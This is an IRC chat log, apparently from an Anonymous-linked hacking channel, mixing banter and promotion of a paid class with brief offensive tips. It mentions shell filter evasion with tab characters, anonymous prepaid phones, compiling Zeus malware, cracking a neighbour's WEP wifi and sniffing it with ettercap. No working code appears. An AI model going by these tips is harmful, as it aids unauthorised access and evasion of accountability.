[08:31.42] <JackofCoins> far
[08:31.42] <Rode0s_> Far far away
[08:31.47] <Rode0s_> XD
[08:31.50] <JackofCoins> too many fars
[08:32.03] <loves2splooj> two too many
[08:32.04] <Rode0s_> Actually like july
[08:32.10] <JackofCoins> lol
[08:32.13] <derpfish> Right, well I'm going to bed
[08:32.15] <urfriend> like bed
[08:32.16] <loves2splooj> that explains it
[08:32.24] <derpfish> But I want to leave you with one more fun fact
[08:32.30] <JackofCoins> what is a 'proper' c++ compiler for windows?
[08:32.51] <urfriend> msvc
[08:32.56] <JackofCoins> like standard/generic
[08:33.04] <FoxInSocks571> gcc
[08:33.26] <Rode0s_> Gcc
[08:33.44] <tokentkr> its pretty good stuff, if i may add
[08:33.44] <derpfish> In shell commands, the tab character can replace a space
[08:33.45] <urfriend> msvc creates better executables
[08:33.52] <derpfish> So
[08:33.54] <derpfish> echo lulz
[08:34.03] <derpfish> is equal to echo<tab>lulz
[08:34.13] <derpfish> Where <tab> is 0x09
[08:34.31] <derpfish> In Windows, there are other characters too
[08:34.33] <urfriend> = windows
[08:34.33] <derpfish> Like comman
[08:34.42] <derpfish> s/comman/comma/
[08:35.05] <derpfish> And now, I'm going to bed
[08:35.30] <JackofCoins> ite gnite
[08:35.31] <n0de> fuck i need to go to bed too
[08:35.44] <hatter> but we're not done yet
[08:35.49] <n0de> lol
[08:35.54] <hatter> xo and I haven't even recapped web apps
[08:35.55] <urfriend> the web
[08:35.56] <hatter> lol
[08:36.00] <n0de> haha
[08:36.38] <hatter> but for now
[08:36.41] <hatter> something simple
[08:36.46] <hatter> anonymous shit
[08:36.50] <hatter> but like
[08:36.50] <hatter> handy anon shit
[08:37.07] <hatter> net10 and boost mobile in the us
[08:37.11] <urfriend> their mobile
[08:37.17] <hatter> let you pick your area code
[08:37.22] <hatter> when entering your zip code
[08:37.26] <hatter> ;)
[08:37.47] <hatter> additionally,
[08:37.55] <hatter> you can go get prepaid virginmobile 3g hotspots
[08:37.57] <urfriend> to go
[08:37.59] <hatter> n buy cards
[08:38.06] <hatter> there's no real verification
[08:38.08] <hatter> on anything
[08:39.04] <loves2splooj> didn't know that
[08:39.23] <Incognito> guys, do anyone have documentation on Null Character Evasion in IE ?
[08:39.38] <sandstone> also: with most prepaids, they include a few minutes of airtime for free, usually don't need to buy a card
[08:39.55] <hatter> Incognito: whatcha mean?
[08:40.04] <hatter> sandstone: Truth.  Not many though.
[08:40.07] <hatter> Like
[08:40.10] <hatter> you can get 15 minutes
[08:40.11] <hatter> or 10 minutes
[08:40.13] <hatter> with the phone
[08:40.16] <Incognito> http://seclists.org/fulldisclosure/2005/Sep/415, hatter
[08:40.17] <urfriend> u like a hybrid of two businesss actually
[08:40.20] <Incognito> i need further information
[08:40.20] <hatter> but not much else
[08:40.20] <hatter> lately.
[08:40.24] <sandstone> tracfone includes 20 afaik, but either way somethin to keep in mind
[08:40.41] <n0de> lol throwaway fone
[08:40.47] <n0de> tracfone's are win
[08:42.03] <hatter> Incognito: that looks almost just like a standard overflow
[08:42.07] <hatter> where nullchars can exceeed the buffer
[08:42.35] <Incognito> yeah...i want to know if the new version of IE are affetec by it, if u know
[08:42.45] <Incognito> or w@ versions are affected
[08:42.45] <hatter> I am not sure.
[08:42.48] <hatter> I have not tested.
[08:42.50] <Incognito> ok
[08:43.21] <hatter> ne1 got an ie box?
[08:43.23] <CheGuevara> Incognito are you italian?
[08:43.28] <urfriend> box and playing with a large trout
[08:43.34] <hatter> I'd hexedit the file
[08:43.39] <hatter> for that
[08:43.39] <hatter> I'll do a live test
[08:43.45] <hatter> if someone has an ie machine
[08:43.59] <Srgamg> thank you all
[08:44.00] <hatter> and somewhere for me to shove a file.
[08:44.05] <urfriend> that lies somewhere else xd

[08:44.14] <hatter> ^?
[08:44.15] <hatter> lol
[08:44.21] <hatter> That's what I was thinking.
[08:44.22] <CheGuevara> rofl
[08:44.27] <n0de> you know what the #1 use for IE is?
[08:44.30] <n0de> downloading firefox/chrome
[08:44.32] <n0de> that is all.

[09:31.45] <Korrupt> what are we talking about? i just jumped in
[09:31.57] <s4> talks are pretty much over
[09:31.58] <Rode0s_> Hack the planet
[09:32.00] <s4> afaik
[09:32.10] <Rode0s_> They are trashing our rights
[09:32.20] <Korrupt> who is?
[09:32.20] <Rode0s_> So we hax gibsons
[09:32.24] <s4> lets talk about how2hax gibson
[09:32.46] <VIA> we talked about vulnerabilities in the gibson mainframe
[09:32.50] <Milky> first
[09:32.56] <Milky> what is gibson?
[09:33.00] <s4> how it is open to attacks such as
[09:33.05] <s4> * SQLi
[09:33.14] <VIA> an angry drunk celeb, duh!
[09:33.15] <Alascar> I use Havij for that
[09:33.18] <Rode0s_> XD lol at Milky
[09:33.34] <Milky> i am still confused
[09:33.52] <Korrupt> a gibson is vulnerbale to sqli?
[09:34.00] <s4> very much so
[09:34.04] <Korrupt> i thought  a gibson was only in the movies
[09:34.06] <VIA> its a quote from a movie abt hackers... just a joke
[09:34.09] <Korrupt> yeah
[09:34.10] <Korrupt> haha
[09:34.15] <Alascar> So, what is DDoS? Can someone explain it to me?
[09:34.21] <Milky> what movie?
[09:34.24] <s4> fuck you
[09:34.24] <s4> spoiling my fun
[09:34.26] <Korrupt> Distributed Denial of Service
[09:34.32] <Korrupt> movie = hackers
[09:34.43] <VIA> ddos is like trying to cram 5 cocks into one vag at the same time
[09:34.48] <s4> wow
[09:34.52] <Alascar> ...
[09:34.56] <Korrupt> thats a decent analogy
[09:35.08] <Milky> lol
[09:35.11] <Alascar> Explain please.
[09:35.12] <s4> that is one of the best defs
[09:35.24] <s4> ok
[09:35.24] <s4> so
[09:35.37] <s4> you're basically overloading a server with requests
[09:35.48] <Korrupt> with packets
[09:35.51] <Anubis> *wave* mornin btw
[09:35.56] <Alascar> What kind of requests?
[09:35.57] <Korrupt> from more than one computer
[09:36.04] <s4> korrupt said it
[09:36.09] <s4> that's really all a ddos is
[09:36.16] <Alascar> Packets?
[09:36.22] <s4> it'll render the server useless for a while
[09:36.31] <Korrupt> yes packets, little pieces of information
[09:36.36] <s4> now there are ways to do it properly that have been covered
[09:36.42] <Anubis> its like thousand persons click at the login button every 5 seconds @ Alascar
[09:37.03] <Anubis> or "a few more"
[09:37.09] <Milky> ya but they have a script to do it
[09:37.17] <Milky> and prolly do it alot faster then every 5 seconds
[09:37.19] <Alascar> Bots you mean?
[09:37.26] <Korrupt> when you visit a website packets are sent back and forth between you and the webserver, now think about millions of computers doing this over a short period of time. It will make the server crash
[09:37.26] <Milky> w/e's
[09:37.30] <s4> a whole hell of a lot faster than 5 secs
[09:37.41] <s4> unless you use dial up
[09:38.18] <Alascar> Im getting this from Wiki: Attacks against the root nameservers can impact operation of the entire Internet, rather than specific websites.
[09:38.38] <VIA> i used to crack AOL SNs at like one attempt per fifteen secs on dialup... dont knock it!
[09:38.38] <Alascar> The entire Internet?
[09:38.50] <s4> read more on root nameservers
[09:38.59] <Alascar> Mkay
[09:39.00] <s4> then you'll understand what'll happen w/o them
[09:39.09] <Alascar> Thanks for the help btw :)
[09:39.13] <s4> np
[09:39.14] <Korrupt> nameservers take care of numerous websites
[09:39.27] <Korrupt> zone transfer
[09:40.02] <VIA> if he doesnt know what a packet is, i doubt he will understand NSs  :P   i say just stick to the five cocks in one vag analogy
[09:40.07] <raine> n_n
[09:40.19] <Korrupt> haha yeah thats a good analogy
[09:41.03] <VIA> or maybe... trying to put two fat guys into a revolving door at the same time... same deal.... yer overloading it.
[09:41.48] <Alascar> Not that I dont get it, just havent heard the term yet
[09:42.05] <Korrupt> you will if you get involved in the hacking community
[09:42.07] <Anubis> ddos was very often in the medias last weeks
[09:42.23] <Korrupt> i honestly do not like ddos
[09:42.36] <Milky> it's more of an annoyance then anything else
[09:42.45] <Milky> unless you can manage to do it indefinietly @_@
[09:42.46] <Korrupt> yeah, its not really hacking
[09:42.57] <Anubis> there is no message which is spread and makes just everyone sick
[09:43.01] <Korrupt> well i mean if you have the botnet than yes but otherwise no
[09:43.21] <fxm> http://pastebin.com/ajy8nk34 - this should explain a lot of it
[09:43.22] <Alascar> Botnet? Sorry, I just join Anon two days ago >.>
[09:43.26] <VIA> ddos is just overloading a web site so normal users cant communicate with it... its not complicated... youre overanalyzing it  .p
[09:43.35] <VIA> :p  *
[09:43.39] <Big> Botnet is a infected computer right?
[09:43.58] <Korrupt> a botnet is a network of infected computers
[09:44.00] <VIA> a network of rooted computers
[09:44.07] <Anubis> botnet = a network of "infected computers" who work in your puppose
[09:44.14] <Korrupt> exactly
[09:44.16] <Alascar> I like this
[09:44.17] <Anubis> you can even rent them
[09:44.23] <Big> I was close haha
[09:45.09] <Korrupt> yes haha just a bunch of infected computers
[09:47.37] <FoxInSocks415> hello everyone
[09:47.41] <Alascar> Hi
[09:47.44] <Korrupt> sup
[09:48.01] <FoxInSocks415> wht is this all about.............:P
[09:48.44] <Korrupt> h4ck1ng
[09:49.14] <FoxInSocks502> When do we learn stuff?
[09:49.23] <Milky> when the mods wake up
[09:49.42] <Korrupt> what have they lectured about in the past?
[09:49.56] <FoxInSocks502> Is it like a lesson or more of a Q&A
[09:50.10] <tytaN> lol
[09:50.15] <tytaN> we do lessons
[09:50.18] <Korrupt> like...
[09:50.21] <tytaN> check out the topic link
[09:50.31] <tytaN> to prior talks and rules
[09:50.34] <Korrupt> pastebin one?
[09:50.38] <tytaN> and there's #academy
[09:50.44] <tytaN> which u can join for advanced lessons
[09:51.00] <Korrupt> what type of advanced lessons are those
[09:51.05] <tytaN> but u'll have to pay
[09:51.11] <Korrupt> money?
[09:51.11] <tytaN> only the first class got it for free
[09:51.12] <tytaN> promotion and shit
[09:51.14] <tytaN> everything
[09:51.19] <Korrupt> sucks
[09:51.24] <tytaN> bitcoins
[09:51.30] <Korrupt> ./
[09:51.40] <tytaN> :#
[09:51.41] <s4> trust me, they are good classes
[09:51.44] <tytaN> u can pay with paypal as well
[09:51.48] <tytaN> we do a lot of advanced stuff in there
[09:51.56] <Korrupt> like what are some topics
[09:52.02] <tytaN> from bash to ruby
[09:52.03] <tytaN> everything u need
[09:52.11] <FoxInSocks502> How do we catch up if we missed the previous classes?
[09:52.13] <s4> i think the list is in the pastebin link
[09:52.16] <tytaN> we started with a tutorial to install gentoo linux
[09:52.22] <tytaN> than bash lessons
[09:52.44] <Milky> are you guys like
[09:52.48] <Korrupt> what os's is everyone on?
[09:52.48] <Milky> advertiseing for this class?
[09:53.12] <tytaN> exploits n shit
[09:53.12] <Korrupt> im on ubuntu
[09:53.15] <tytaN> linux
[09:53.16] <tytaN> gentoo
[09:53.16] <tytaN> only linux up in here
[09:53.17] <s4> advertising, no
[09:53.20] <s4> advocating, yes
[09:53.25] <FoxInSocks807> I'm sorry, I missed your answer. I was wondering how we catch up if we missed the previous classes
[09:53.27] <tytaN> but in academy they'll teach some advanced windows stuff as well
[09:53.30] <tytaN> :p
[09:53.36] <Korrupt> is gentoo good? i heard it takes forever to compile packeges?
[09:53.50] <tytaN> well there's enrollment for the next semestre or whatever you want to call it
[09:53.52] <s4> FoxInSocks807, the link
[09:53.53] <tytaN> for the next group
[09:53.56] <s4> in the topic
[09:53.59] <tytaN> they'll do everything from the beginning again i think
[09:54.02] <tytaN> yo
[09:54.09] <tytaN> and the topic has all previous #school logs
[09:54.14] <tytaN> should be pretty self explanatory
[09:54.21] <FoxInSocks807> When does the next semester start?
[09:54.41] <tytaN> it's not really a semester but i don't know what to call it :D
[09:54.42] <tytaN> i don't know
[09:54.44] <tytaN> you gotta ask fox
[09:54.56] <tytaN> or any other op
[09:54.57] <_Legi0n> tytaN, you talking about #academy?
[09:55.19] <s4> get in touch w/ fox or hatter for adv. class questions
[09:55.25] <tytaN> i am.
[09:55.25] <tytaN> i did.
[09:55.42] <_Legi0n> iirc hatter said we start where we left off.
[09:55.54] <raine> that is also the last thing i heard
[09:56.04] <Korrupt> how much is it?
[09:56.05] <tytaN> ah yeah ofc
[09:56.06] <tytaN> but for new class enrollment
[09:56.13] <tytaN> for the newbz who're new in here
[09:56.15] <tytaN> dunno
[09:56.38] <tytaN> wait until hatter or fox or Sav return (i think Terminal=hatter)
[09:56.40] <tytaN> ask them
[09:56.43] <tytaN> in the meantime
[09:56.46] <tytaN> read through the topic
[09:56.50] <tytaN> and the links in the topic
[09:56.52] <tytaN> and if u're interested
[09:56.54] <raine> Terminal is not hatter
[09:56.56] <tytaN> the logs that're linked in there
[09:57.03] <tytaN> than u'll have a pretty good idea
[09:57.05] <tytaN> is it sav?
[09:57.06] <_Legi0n> terminal != hatter. hatter == hatter.
[09:57.09] <tytaN> i don't remember :>
[09:57.22] <tytaN> :p
[09:57.28] <s4> terminal == terminal
[09:57.34] <tytaN> get off my balls ;(
[09:57.57] <Bot> For future reference, I am Alascar, just with a cooler name
[09:58.05] <Korrupt> haha
[09:58.09] <Bot> WHOIS is there to help you if you forget
[09:58.10] <Korrupt> okay bot
[09:58.18] <tytaN> lol rly I thought he had a different nick on canthack.us but I don't remember :>
[09:58.44] <Bot> canthack.us is just asking to get hacked
[09:58.53] <_Legi0n> nope. only student nicks changed afaik.
[09:58.56] <FoxInSocks807> I'm at pastebin and I see the previous topics. How do I access the logs of the previous talks?
[09:58.57] <tytaN> begging
[09:59.00] <tytaN> so to speak
[09:59.06] <tytaN> kk
[09:59.14] <Anubis> !topic
[09:59.49] <Bot> My website is better then canthack.us... that is pathetic...
[10:00.13] <tytaN> FoxInSocks807: fo'getaboutit
[10:00.24] <tytaN> Bot: I wouldn't take myself too seriously lol
[10:00.25] <tytaN> and if that's true
[10:00.42] <tytaN> u gotta become a teacher in here
[10:00.48] <tytaN> and if not
[10:01.02] <tytaN> that statement was ridiculous
[10:01.03] <tytaN> :\
[10:01.07] <Bot> Huh?
[10:01.12] <Rode0s_> Oo
[10:01.20] <Anubis> well to combine... the school is for free and you got to pay for advanced knowledge?
[10:01.32] <tytaN> FoxInSocks807: http://pastebin.com/Npiisqyw
[10:01.42] <tytaN> FoxInSocks807: check out the mediafire link
[10:01.45] <Milky> paying for school is lame @_@
[10:01.54] <Milky> i'mah take a moral stance against it
[10:01.59] <Rode0s_> Its very wortg it
[10:02.00] <tytaN> i mean that's the page our profs put up
[10:02.04] <tytaN> yup
[10:02.08] <Rode0s_> U learn a lot
[10:02.08] <FoxInSocks559> what is canthack.us anyway? it appears to just say smb etc
[10:02.10] <tytaN> because u are late :\
[10:02.10] <tytaN> we didn't have to pay
[10:02.16] <tytaN> but it's definitely worth it
[10:02.17] <tytaN> it's not expensive
[10:02.22] <Bot> Fox, that is what I meant
[10:02.31] <Anubis> define "not expensive" ;D depends on the income
[10:02.54] <Rode0s_> 2btc
[10:03.01] <Rode0s_> Last i heard
[10:03.07] <Anubis> means? =D
[10:03.17] <Bot> I believe in one of the videos in the anonyops youtube channel they talk about how info should be free and not have to be paid for
[10:03.20] <tytaN> these suckers from backtrack offer lessons for 1000$+
[10:03.20] <tytaN> per topic
[10:03.28] <tytaN> and they're most definitely not as skilled as our teachers
[10:03.30] <tytaN> it's 2 figures
[10:03.31] <tytaN> or 1
[10:03.31] <tytaN> :D
[10:03.45] <Anubis> im sorry but english is not my mothertongue, which means, i will not understand everything instantly
[10:03.53] <tytaN> wow bot
[10:03.53] <tytaN> very inspiring
[10:03.56] <tytaN> if god would pay for webservers
[10:03.57] <tytaN> and hsit
[10:03.58] <tytaN> no problem
[10:04.22] <Bot> I no liek sarcasm broseph
[10:04.29] <Anubis> in another video is said, that "stuff for free" sells you and your information
[10:04.30] <tytaN> and btw
[10:04.35] <tytaN> they put the knowledge up for free
[10:04.42] <tytaN> that's why u are allowed to be in here
[10:04.49] <tytaN> but the stuff in #academy is 'classified' information
[10:04.54] <tytaN> it's advanced and dangerous/powerfull stuff
[10:04.54] <Bot> Oh?
[10:05.04] <tytaN> ya
[10:05.09] <Bot>  /join #academy
[10:05.16] <tytaN> so there's no need to rub it in everyones face, even though they probably would
[10:05.18] <tytaN> if they had the money
[10:05.26] <FoxInSocks559> Does anyone have any advice on compiling / using zeus?
[10:05.26] <Korrupt> ./join #academy
[10:05.29] <Korrupt> fail
[10:05.30] <Bot> Requires keyword.....
[10:05.35] <Korrupt> ohh isee
[10:05.42] <Bot> Cannot join #academy (Requires keyword).
[10:05.42] <FoxInSocks559> i just have the rar of the source
[10:05.53] <s4> guys, you have to sign up for #academy
[10:06.00] <Rode0s_> We haz zeus in academy
[10:06.01] <RichyB> how much  is the academy?
[10:06.06] <tytaN> that's what we're talking about
[10:06.10] <tytaN> u have to pay from now on to join #academy
[10:06.13] <tytaN> #school == free knowledge for everyone
[10:06.14] <s4> 2btc i think... ?
[10:06.14] <tytaN> #academy == 'classified' knowledge
[10:06.17] <tytaN> 5-20 bucks max i think
[10:06.19] <s4> you'll have to pm fox or hatter.
[10:06.21] <tytaN> depends on bitcoin value
[10:06.24] <s4> yes
[10:06.32] <Bot> I liek fwee stuffz
[10:06.44] <Bot> So yeah, imma stay in school then.
[10:07.12] <Rode0s_> Academy is worth it
[10:07.24] <tytaN> definitely
[10:08.05] <_Legi0n> if you're dedicated, that is.
[10:08.09] <Anubis> just learn enough to even be able to use the knowledge ;D
[10:08.15] <Bot> Well, until I get my debit card, free stuff it is
[10:08.31] <pritbrains> hi
[10:08.39] <pritbrains> im new here
[10:08.41] <tytaN> :)
[10:08.42] <raine> structured lesson plan, pen test sandbox, hands-on help, 1 on 1 assistance etc
[10:08.48] <raine> forgive, i don't usually do the sales pitch
[10:08.51] <raine> :P
[10:08.52] <tytaN> /o\
[10:08.57] <_Legi0n> you forgot the girls.
[10:09.00] <pritbrains> how do we learn from this
[10:09.02] <raine> oh, naked girls
[10:09.03] <Anubis> boobs? :D
[10:09.03] <pritbrains> ?
[10:09.03] <tytaN> :)
[10:09.11] <tytaN> and the drugs
[10:09.11] <raine> and bacon.
[10:09.19] <Milky> i'm pretty convinced your all the same people trying to lure me into a sale
[10:09.19] <_Legi0n> bacon covered girls.
[10:09.25] <raine> lactating scotch
[10:09.48] <raine> yeah i always go 1 too far :(
[10:10.00] <Milky> lol
[10:10.14] <Bot> I minimized xChat for a sec. I am ashamed to admit the first thing I saw when I came back was naked girls and boobs
[10:10.34] <_Legi0n> it works.
[10:10.48] <tytaN> Bot: canthack.us has some subdomains that's probably why u will only see http and ssl as open ports
[10:10.57] <tytaN> :D
[10:11.14] <tytaN> Bot: and no content
[10:11.23] <Bot> Oh, so it is just for pronz then?
[10:11.39] <fxm> <3
[10:11.39] <tytaN> dunno :>
[10:11.45] <tytaN> what they use the main domain for
[10:11.54] <FoxInSocks109> +h
[10:11.54] <Korrupt> I hate rats
[10:12.01] <Bot> Or is it just some site for hackers to test?
[10:12.01] <tytaN> the subdomains are for test purposes etc
[10:12.12] <tytaN> y
[10:12.17] <tytaN> mostly so far
[10:12.27] <tytaN> but we'll put up a real website
[10:12.38] <tytaN> s/we/they/
[10:12.39] <Bot> Cool
[10:12.41] <tytaN> ;p
[10:13.04] <Bot> I am making a website tomorrow using webs.com
[10:13.23] <Bot> When I am done with that, I will use pastehtml.com for giggles
[10:14.04] <tytaN> :#
[10:14.30] <loves2splooj> so whats the deal with #academy?
[10:14.53] <Bot> I am bored an love the internet like I would a child. Dont judge me
[10:15.01] <tytaN> scroll up loves2splooj
[10:15.14] <tytaN> hehe
[10:15.20] <tytaN> no worriez
[10:15.24] <Bot> Wait, wait. What is Splooj and why do you love it?
[10:15.46] <raine> hng. we need an FAQ up
[10:15.53] <loves2splooj> i didn't see the conversation lol just that it was classified and i was like wtf?
[10:15.56] <loves2splooj> sorry
[10:16.14] <Anubis> faq would be very handy
[10:16.41] <Bot> Btw, is Amazon a good place to buy my Anonymous mask?
[10:16.44] <_Legi0n> raine, i was tempted to write something days ago but since the servers seem mostly done.. why bother?
[10:17.16] <Korrupt> night everyone
[10:17.22] <Bot> Night
[10:17.23] <s4> gnight
[10:17.29] <tytaN> bb
[10:18.05] <raine> we don't have an FAQ typed up if you'd like to piece one together and we can modify it over time if needed
[10:18.40] <Anubis> sounds like a good idea to me
[10:19.18] <darkness> So when do the lessons start :-)
[10:19.31] <loves2splooj> so its more of an actual school than this?
[10:19.38] <raine> yes
[10:19.41] <tytaN> yes
[10:19.46] <Bot> YUS
[10:19.46] <tytaN> these are open speeches
[10:19.52] <schnozzle> school...
[10:19.54] <loves2splooj> ti know that
[10:19.56] <raine> sec, i'll grab a link to curriculum
[10:19.58] <raine> :)
[10:20.06] <Anubis> also an overview with often used terms would be usefull to make everyone understand either... hm
[10:20.07] <Bot> Think of it as tech support of hackers xD
[10:20.08] <tytaN> #academy is school with individual support etc
[10:20.19] <loves2splooj> do you need prior knowledge?
[10:20.32] <Bot> School I meant, not Academy
[10:20.35] <_Legi0n> you should know how to google.
[10:20.40] <schnozzle> i have no prior knowledge :(
[10:20.43] <darkness> Is Dave Aitel going to be giving a talk  9.9
[10:20.48] <tytaN> :D
[10:20.48] <raine> being comfortable in a linux/unix environment would be a very good start
[10:20.54] <tytaN> not for #academy
[10:21.00] <tytaN> :D
[10:21.04] <tytaN> find the powerON/OFF button
[10:21.23] <Bot> Linux? The thing didnt like my wifi. Couldnt connect to anything wirelessly.
[10:21.37] <Anubis> i know what unix is, but im not that confident with it... using the microsoft stuff instead atm and like it tbh
[10:21.52] <darkness> so how do u get the key to join academy?
[10:21.56] <loves2splooj> i find myself in a gray area when it comes to experience in computer hacking
[10:22.07] <loves2splooj> you pay
[10:22.12] <darkness> lol
[10:22.28] <tytaN> Bot: that's a normal 'problem' if you're new to linux. u actually have to find out how to get it running
[10:22.31] <s4> Anubis: you're really hindering yourself
[10:22.32] <tytaN> Bot: u'll have to install firmware and drivers
[10:22.36] <tytaN> Bot: and enable support in the kernel
[10:22.38] <tytaN> google this and it'll work
[10:22.48] <s4> you can do VMs, but many have found that they don't use the VM much
[10:22.50] <tytaN> everybody has these problems in general (if u don't use ubuntu or backtrack)
[10:22.57] <tytaN> but it's easy to install
[10:23.06] <Anubis> i use knoppix sometimes :D
[10:23.06] <Bot> Well, my uncle is a computer engineer, when I gave it to him he did that, but couldnt get it working
[10:23.16] <Anubis> wheres my cookie thatfor? ;D
[10:23.19] <darkness> i've used linux for years. debian, open bsd using shell account. mainly use osx now which is a unix deriv
[10:23.28] <loves2splooj> with my peers i never cease to amaze with my tech knowledge but around actual hackers i get blown away
[10:23.43] <Bot> ^
[10:23.43] <raine> hum
[10:23.48] <loves2splooj> ubuntu used to be my default os
[10:23.49] <s4> same here
[10:23.58] <darkness> debian is cool
[10:24.03] <s4> i thought i knew some shit
[10:24.08] <darkness> apt-get == win
[10:24.17] <tytaN> Bot: u have to configure a lot of stuff manually since most linux distros have no all-around plug-n-play support
[10:24.17] <loves2splooj> i use backtrack when i have a need for it
[10:24.18] <s4> apt-get is nice i must admit
[10:24.29] <tytaN> Bot: but believe me it's not that hard, and there's good documentation for every distro and every wifi-card available
[10:24.33] <tytaN> Bot: check out archlinux or gentoo wiki
[10:24.47] <tytaN> I prefer pacman and emerge :\
[10:24.49] <_Legi0n> actually. if you are like.. forced to use windows... get dual monitors and just run the vm in fullscreen mode.
[10:24.50] <tytaN> but apt-get is easy to handle
[10:24.54] <darkness> how about running ubunto from a pen drive?
[10:25.00] <Anubis> vm?
[10:25.06] <_Legi0n> virtual machine.
[10:25.07] <s4> virtual machine
[10:25.09] <darkness> virtual machine
[10:25.10] <Anubis> ah okay
[10:25.11] <s4> timing
[10:25.15] <tytaN> i do that darkness, but I don't use ubuntu
[10:25.28] <Bot> I am just going to leave it alone for now. AnonymousUIO told me to try Backtrack when I want to get serious with this stuff, so I want to first get some knowledge before hand
[10:25.32] <darkness> thing is everything u do leaves shit on os.
[10:25.32] <tytaN> we wouldn't suggest to use ubuntu anyway
[10:25.36] <raine> gentoo installation is mandatory for #academy, even if only in a VM
[10:25.48] <tytaN> Backtrack is _very_ easy to use
[10:25.56] <tytaN> u just put in the cd and everything works
[10:25.59] <tytaN> all the pentesting too
[10:26.01] <tytaN> ls
[10:26.05] <s4> i use the gentoo install i set up as my main os now
[10:26.05] <Anubis> so gentoo would be a good idea to be used?
[10:26.10] <tytaN> are installed already and ready to run
[10:26.17] <loves2splooj> i thought backtrack is built from ubuntu?
[10:26.19] <darkness> guess so. mandatory :-P
[10:26.21] <s4> you'll learn a TON from installing gentoo
[10:26.24] <_Legi0n> giving backtrack to noobs is like giving your 3yo son a ferrari to play.
[10:26.27] <tytaN> but.. backtrack kinda sucks because it's all pre-aranged
[10:26.34] <Bot> I was just going to put it in my flash drive :P
[10:26.36] <tytaN> Anubis: we use gentoo
[10:26.37] <s4> lol
[10:26.39] <tytaN> in academy
[10:26.45] <tytaN> lol :D
[10:26.48] <s4> backtrack is good for cracking weps on-the-go
[10:26.51] <Bot> wtf is gentoo?
[10:26.59] <_Legi0n> yeah. but you don't really learn
[10:27.04] <s4> a linux distro
[10:27.11] <darkness> so does acadamy deal with machine code and heap based overflows?
[10:27.20] <tytaN> gentoo is a kind of penguin
[10:27.22] <tytaN> and a linux distribution
[10:27.23] <_Legi0n> i learned ten times more from installing gentoo than from using backtrack
[10:27.31] <tytaN> ;)
[10:27.38] <tytaN> machine code is on the list
[10:27.38] <tytaN> of topics
[10:27.54] <Anubis> guess i'll learn quit much here
[10:27.55] <loves2splooj> where can i find the list?
[10:28.01] <_Legi0n> actually, i heard it's one of the next. <:
[10:28.01] <_Legi0n> but don't quote me on that
[10:28.09] <MrWonderful> gen2 install took me just 2 ful days
[10:28.12] <Anubis> *Quotes _Legi0n*
[10:28.15] <raine> yes darkness
[10:28.17] <darkness> right, off to social a password :-P
[10:28.25] <raine> in the later classes
[10:28.34] <s4> c and asm are next for the #academy nigs
[10:28.47] <Bot> Is there a place with a list of all the channels on irc.anonops.li?
[10:28.50] <Anubis> sometimes it is really hard to follow -.-
[10:28.51] <s4> /list
[10:28.55] <Anubis> ./ list
[10:29.00] <Anubis> erm
[10:29.05] <raine> i don't recommend that
[10:29.06] <darkness> will the jester be giving the tuts :-P
[10:29.16] <Anubis> how did you that without let it act as order s4? :D
[10:29.26] <Anubis> +do
[10:29.28] <raine> lol
[10:29.47] <s4> i put the character used to clear color/formatting in front of it
[10:29.50] <Bot>  /list did nothing :\
[10:29.59] <Anubis> *head->desktop*
[10:30.03] <tytaN> lol
[10:30.05] <s4> lol
[10:30.05] <tytaN> i doubt that darkness :D

[10:30.13] <s4> what irc client are you using
[10:30.18] <tytaN> in the beginning some LulzSec guys made some speeches for example

[10:30.30] <Anubis> xchat 2.8.6-2 Windows Vista [AMD/1.60GHz]
[10:30.40] <tytaN> but u'll rather see black and gray hats in here
[10:30.40] <tytaN> no white hats
[10:30.41] <tytaN> :D
[10:30.42] <s4> Bot,

[10:33.12] <Bot> #ascii looks like death
[10:33.20] <Anon-E-Mus> So I just joined, how do i learn how this works
[10:33.32] <Bot> #bots..... brb
[10:33.40] <tytaN> lol
[10:33.44] <tytaN> u type fast
[10:33.47] <darkness> http://www.google.com/imgres?imgurl=http://www.koolsun.co.uk/acatalog/bobble%2520hat%2520blue.jpg&imgrefurl=http://www.koolsun.co.uk/acatalog/Ski_hats.html&h=300&w=300&sz=30&tbnid=Khh1ahYArWrlGM:&tbnh=89&tbnw=89&prev=/search%3Fq%3Dbobble%2Bhat%2Bpics%26tbm%3Disch%26tbo%3Du&zoom=1&q=bobble+hat+pics&docid=CVR9Ko0REO3ogM&sa=X&ei=z5NDTpLGBsjcsgbDwbD1Bw&ved=0CFsQ9QEwFQ&dur=1896
[10:34.04] <darkness> that's the hat i roll with
[10:34.10] <Anon-E-Mus> ^Boss
[10:34.36] <Bot> Darkness, can  ask why that link is f*cking huge?
[10:34.59] <darkness> cause i'm a lazy cunt :-P
[10:35.01] <Anubis> tinyurl ftw :D
[10:35.04] <tytaN> ask google :>
[10:35.44] <Bot> Oh, ok. I see where the /list thing went... dat spam
[10:36.19] <Anon-E-Mus> Anyone want to explain to me how this works?
[10:36.30] <Bot> How what works?
[10:36.36] <Anon-E-Mus> I'm a Noob
[10:36.40] <Anubis> the school i guess
[10:36.44] <Anon-E-Mus> yeah
[10:36.58] <Bot> For noobs, I suggest you join #Opnewblood aswell
[10:37.03] <tytaN> Anon-E-Mus: this is a channel with open speeches/lessons
[10:37.08] <tytaN> check out the topic
[10:37.10] <darkness> hang on Laurelai is here. disclaimer: incase of leaked logs i'm only here for some company to chat with.
[10:37.13] <tytaN> for rules/channel explanation/link to previous lessons
[10:37.16] <cassan0va> why Bot ?
[10:37.44] <darkness> so being anonymous on the internet.
[10:37.50] <darkness> pendrive o.s
[10:38.01] <Bot> Because, he can learn about how to become Anonymous before he learns how to do stuff like Anonymous
[10:38.29] <darkness> vpn bought with by prepaid cc and that ordered using tor or interet cafe
[10:39.20] <darkness> mac adress spoofing maybe
[10:39.22] <Bot> I will have pendrive os when I am ready to live the hacker end of the Anon life
[10:39.36] <Bot> I already spoofed my mac adress :D
[10:39.51] <darkness> then u don't need to spoof ur mac
[10:40.03] <Bot> ...
[10:40.28] <Anubis> i would be very proud of myself if i even could use my neighbours internet for an first tryout
[10:40.31] <Anubis> :D
[10:40.42] <darkness> if they use wifi then :-)
[10:40.50] <darkness> sniff their traffic... cough
[10:40.58] <Anubis> sure, but how =P
[10:41.09] <fxm> ettercap
[10:41.10] <darkness> tbh i prefer to sniff her knickers myself :-)
[10:41.14] <tytaN> that's very easy depending on your neighbours wifi security
[10:41.21] <tytaN> to my experience 1 in 8 networks still use WEP keys
[10:41.25] <tytaN> they take like 5 minutes to crack
[10:41.26] <darkness> usually wpa
[10:41.26] <N4pst3r> oai Sabu
[10:41.28] <Bot> When I move out I am blocking my wifi immediately after I get it out of the box :P
[10:41.33] <tytaN> yes
